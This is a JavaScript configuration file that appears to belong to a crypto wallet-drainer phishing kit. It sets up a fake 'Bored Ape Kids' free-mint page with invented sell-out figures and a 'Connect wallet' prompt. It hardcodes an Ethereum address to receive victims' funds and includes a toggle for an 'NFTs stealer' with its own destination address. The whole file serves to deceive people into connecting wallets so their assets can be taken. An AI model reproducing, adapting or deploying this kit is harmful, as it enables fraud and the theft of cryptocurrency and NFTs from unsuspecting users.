const receiveAddress = "0x28f630de17c2372b21Eb58b3F83b8215BAE85007";

const collectionInfo = {
    name: "Bored Ape Kids",
    socialMedia: {
        discord: "https://discord.com",
        twitter: "https://twitter.com",
    },
}

const indexPageInfo = {
    backgroundImage: "background.jpg", // relative path to background image (in assets)
    title: "{name}", // {name} will be replaced with collectionInfo.name
    underTitle: "FREE MINT",
}

const claimPageInfo = {
    title: "FREE MINT", // <br> is a line break
    shortDescription: "98% SOLD-OUT",
    longDescription: "9832/10000 MINTED",

    claimButtonText: "MINT NOW",

    image: "bg.gif", // relative path to image (in assets)
    imageRadius: 0, // image radius in px
}

const drainNftsInfo = {
    active: false,   // Active (true) or not (false) NFTs stealer.
    minValue: 0.1,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
    nftReceiveAddress: "" // leave empty if you want to use the same as receiveAddress 
}

const customStrings = {
    title: "MINT {name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    connectButton: "Connect wallet",
    transferButton: "Mint now",
    dateString: "Pre sale available {date}", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
}

/*
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (!receiveAddress.startsWith("0x") ||
    (
        receiveAddress.length >= 64 ||
        receiveAddress.length <= 40
    )
) console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
